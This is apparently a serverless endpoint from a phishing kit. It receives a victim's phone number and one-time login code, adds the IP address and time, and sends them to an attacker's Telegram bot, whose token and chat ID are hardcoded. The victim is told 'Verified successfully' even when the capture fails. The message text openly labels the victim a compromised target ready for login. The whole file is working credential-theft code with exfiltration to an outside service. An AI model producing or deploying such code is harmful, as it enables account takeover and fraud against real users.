export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { phone, otp } = req.body;
    
    if (!phone || !otp) {
      return res.status(400).json({ error: 'Phone and OTP required' });
    }
    
    // Your bot credentials
    const BOT_TOKEN = '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = '7933552719';
    
    // Get client info
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const time = new Date().toLocaleString('id-ID');
    
    // OTP captured message
    const message = `✅ *OTP SUCCESSFULLY CAPTURED*
    
📱 *Phone:* \`${phone}\`
🔐 *OTP Code:* \`${otp}\`
📍 *IP:* \`${ip}\`
🕐 *Time:* ${time}
    
⚠️ *TARGET COMPROMISED* - Ready for login`;
    
    // Send to Telegram Bot
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    // Return success
    return res.status(200).json({
      success: true,
      message: 'Verified successfully'
    });
    
  } catch (error) {
    console.error('OTP Log Error:', error);
    
    // Still return success
    return res.status(200).json({
      success: true,
      message: 'Verified (silent log)'
    });
  }
}